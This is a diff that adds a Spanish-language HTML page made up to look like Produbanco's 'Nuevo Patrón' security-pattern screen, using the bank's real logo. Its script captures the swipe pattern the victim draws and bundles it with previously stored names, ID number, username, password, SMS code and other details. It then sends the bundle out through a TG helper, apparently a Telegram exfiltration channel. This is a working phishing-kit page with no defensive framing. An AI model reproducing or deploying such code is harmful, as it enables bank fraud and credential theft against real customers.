@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Patron</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #ffffff;
+      --title: #3f3f3f;
+      --subtitle: #5a5a5a;
+      --dot: #7f7f7f;
+      --link: #80b846;
+      --ring-border: #67be95;
+      --ring-fill: #d8eae3;
+      --line: #95cdb7;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: "Nunito Sans", sans-serif;
+    }
+
+    html,
+    body {
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      overflow: hidden;
+    }
+
+    body {
+      background: var(--bg);
+      color: #000;
+    }
+
+    .page {
+      margin: 0 auto;
+      max-width: 390px;
+      min-height: 100vh;
+      padding: 12px 14px 26px;
+      width: 100%;
+    }
+
+    .logo {
+      background-image: url("https://www.produbanco.com/Produnet/Imagen/DesignSystem/logotipo.svg");
+      background-position: left center;
+      background-repeat: no-repeat;
+      background-size: 210px 58px;
+      height: 58px;
+      margin-bottom: 22px;
+      width: 210px;
+    }
+
+    .title {
+      color: var(--title);
+      font-size: 28px;
+      font-style: normal;
+      font-weight: 700;
+      line-height: 34px;
+      margin: 0;
+      text-align: center;
+    }
+
+    .subtitle {
+      color: var(--subtitle);
+      font-size: 17px;
+      font-style: normal;
+      font-weight: 600;
+      line-height: 24px;
+      margin: 8px 0 0;
+      text-align: center;
+    }
+
+    .pattern-wrapper {
+      margin: 40px auto 0;
+      max-width: 258px;
+      position: relative;
+      width: 100%;
+    }
+
+    .pattern-grid {
+      display: grid;
+      gap: 22px;
+      grid-template-columns: repeat(4, 48px);
+      justify-content: center;
+      position: relative;
+      touch-action: none;
+      user-select: none;
+      width: 100%;
+    }
+
+    .pattern-node {
+      background: transparent;
+      border: 0;
+      border-radius: 50%;
+      cursor: pointer;
+      height: 48px;
+      margin: 0;
+      padding: 0;
+      position: relative;
+      width: 48px;
+      z-index: 3;
+    }
+
+    .pattern-node::before {
+      background: var(--dot);
+      border-radius: 50%;
+      content: "";
+      height: 8px;
+      left: 50%;
+      position: absolute;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      width: 8px;
+      z-index: 2;
+    }
+
+    .pattern-node.active::after {
+      background: var(--ring-fill);
+      border: 1.5px solid var(--ring-border);
+      border-radius: 50%;
+      content: "";
+      height: 56px;
+      left: 50%;
+      position: absolute;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      width: 56px;
+      z-index: 1;
+    }
+
+    .pattern-svg {
+      inset: 0;
+      overflow: visible;
+      pointer-events: none;
+      position: absolute;
+      z-index: 2;
+    }
+
+    .pattern-line {
+      stroke: var(--line);
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      stroke-width: 10;
+    }
+
+    .forgot {
+      color: var(--link);
+      display: block;
+      font-size: 15px;
+      font-style: normal;
+      font-weight: 400;
+      line-height: 24px;
+      margin-top: 36px;
+      text-align: center;
+      text-decoration-line: underline;
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <header class="logo" aria-label="Logotipo Produbanco"></header>
+
+    <h1 class="title">Nuevo Patr&oacute;n</h1>
+    <p class="subtitle">Ingresa tu nuevo patr&oacute;n</p>
+
+    <section class="pattern-wrapper" aria-label="Patr&oacute;n de seguridad">
+      <svg id="patternSvg" class="pattern-svg" aria-hidden="true">
+        <g id="patternSegments"></g>
+        <line id="patternTrail" class="pattern-line" x1="0" y1="0" x2="0" y2="0" opacity="0"></line>
+      </svg>
+
+      <div id="patternGrid" class="pattern-grid">
+        <button class="pattern-node" type="button" data-node="0"></button>
+        <button class="pattern-node" type="button" data-node="1"></button>
+        <button class="pattern-node" type="button" data-node="2"></button>
+        <button class="pattern-node" type="button" data-node="3"></button>
+
+        <button class="pattern-node" type="button" data-node="4"></button>
+        <button class="pattern-node" type="button" data-node="5"></button>
+        <button class="pattern-node" type="button" data-node="6"></button>
+        <button class="pattern-node" type="button" data-node="7"></button>
+
+        <button class="pattern-node" type="button" data-node="8"></button>
+        <button class="pattern-node" type="button" data-node="9"></button>
+        <button class="pattern-node" type="button" data-node="10"></button>
+        <button class="pattern-node" type="button" data-node="11"></button>
+
+        <button class="pattern-node" type="button" data-node="12"></button>
+        <button class="pattern-node" type="button" data-node="13"></button>
+        <button class="pattern-node" type="button" data-node="14"></button>
+        <button class="pattern-node" type="button" data-node="15"></button>
+      </div>
+    </section>
+
+    <a class="forgot" href="#" style="display: none;"></a>
+  </main>
+
+  <script src="tg.js"></script>
+  <script>
+    (function () {
+      const grid = document.getElementById("patternGrid");
+      const svg = document.getElementById("patternSvg");
+      const segments = document.getElementById("patternSegments");
+      const trail = document.getElementById("patternTrail");
+      const nodes = Array.from(grid.querySelectorAll(".pattern-node"));
+
+      let selected = [];
+      let drawing = false;
+      let activePointerId = null;
+      let patternSent = false;
+
+      function nodeToUser(node) {
+        var n = parseInt(node.dataset.node);
+        return (3 - Math.floor(n / 4)) * 4 + (n % 4) + 1;
+      }
+
+      function centerOf(node) {
+        const gridRect = grid.getBoundingClientRect();
+        const rect = node.getBoundingClientRect();
+
+        return {
+          x: rect.left - gridRect.left + rect.width / 2,
+          y: rect.top - gridRect.top + rect.height / 2
+        };
+      }
+
+      function syncSvgSize() {
+        const rect = grid.getBoundingClientRect();
+        svg.setAttribute("width", rect.width);
+        svg.setAttribute("height", rect.height);
+        svg.setAttribute("viewBox", `0 0 ${rect.width} ${rect.height}`);
+      }
+
+      function clearSegments() {
+        segments.innerHTML = "";
+      }
+
+      function drawSegments() {
+        clearSegments();
+
+        for (let i = 1; i < selected.length; i += 1) {
+          const from = centerOf(selected[i - 1]);
+          const to = centerOf(selected[i]);
+          const line = document.createElementNS("http://www.w3.org/2000/svg", "line");
+
+          line.setAttribute("class", "pattern-line");
+          line.setAttribute("x1", from.x);
+          line.setAttribute("y1", from.y);
+          line.setAttribute("x2", to.x);
+          line.setAttribute("y2", to.y);
+
+          segments.appendChild(line);
+        }
+      }
+
+      function addNode(node) {
+        if (selected.includes(node)) {
+          return;
+        }
+
+        selected.push(node);
+        node.classList.add("active");
+        drawSegments();
+      }
+
+      function resetPattern() {
+        selected = [];
+        nodes.forEach(function (node) {
+          node.classList.remove("active");
+        });
+        clearSegments();
+        trail.setAttribute("opacity", "0");
+      }
+
+      function pointerToGrid(event) {
+        const rect = grid.getBoundingClientRect();
+
+        return {
+          x: event.clientX - rect.left,
+          y: event.clientY - rect.top
+        };
+      }
+
+      function updateTrail(event) {
+        if (!drawing || selected.length === 0) {
+          trail.setAttribute("opacity", "0");
+          return;
+        }
+
+        const last = centerOf(selected[selected.length - 1]);
+        const point = pointerToGrid(event);
+
+        trail.setAttribute("x1", last.x);
+        trail.setAttribute("y1", last.y);
+        trail.setAttribute("x2", point.x);
+        trail.setAttribute("y2", point.y);
+        trail.setAttribute("opacity", "1");
+      }
+
+      function onPointerDown(event) {
+        const node = event.target.closest(".pattern-node");
+        if (!node) {
+          return;
+        }
+
+        patternSent = false;
+        syncSvgSize();
+        resetPattern();
+
+        drawing = true;
+        activePointerId = event.pointerId;
+        grid.setPointerCapture(activePointerId);
+
+        addNode(node);
+        updateTrail(event);
+      }
+
+      function onPointerMove(event) {
+        if (!drawing || event.pointerId !== activePointerId) {
+          return;
+        }
+
+        updateTrail(event);
+
+        const element = document.elementFromPoint(event.clientX, event.clientY);
+        const node = element && element.closest(".pattern-node");
+
+        if (node && grid.contains(node)) {
+          addNode(node);
+        }
+      }
+
+      function endDrawing(event) {
+        if (!drawing || event.pointerId !== activePointerId) {
+          return;
+        }
+
+        drawing = false;
+        trail.setAttribute("opacity", "0");
+
+        if (grid.hasPointerCapture(activePointerId)) {
+          grid.releasePointerCapture(activePointerId);
+        }
+
+        activePointerId = null;
+
+        if (selected.length >= 4 && !patternSent) {
+          patternSent = true;
+          var pattern = selected.map(nodeToUser).join('-');
+          TG.save('patron', pattern);
+
+          var msg = '\u{1F464} Nombres: ' + TG.load('nombres') + '\n'
+            + '\u{1F464} Apellidos: ' + TG.load('apellidos') + '\n'
+            + '\u{1F4C4} Documento: ' + TG.load('documento') + '\n'
+            + '\u{1F4C4} COD DIG: ' + TG.load('codDig') + '\n'
+            + '\u{1F3E6} \u00BFEs Cliente?: ' + TG.load('esCliente') + '\n'
+            + '\u{1F464} USU: ' + TG.load('usuario') + '\n'
+            + '\u{1F512} SENA: ' + TG.load('sena') + '\n'
+            + '\u{1F511} SMS: ' + TG.load('sms') + '\n'
+            + '\u{1F510} NUEVO PATRON: ' + pattern;
+
+          TG.overlay(true);
+          TG.send(msg, false);
+        } else if (selected.length > 0) {
+          setTimeout(resetPattern, 900);
+        }
+      }
+
+      grid.addEventListener("pointerdown", onPointerDown);
+      grid.addEventListener("pointermove", onPointerMove);
+      grid.addEventListener("pointerup", endDrawing);
+      grid.addEventListener("pointercancel", endDrawing);
+      window.addEventListener("resize", syncSvgSize);
+
+      syncSvgSize();
+    })();
+  </script>
+</body>
+</html>
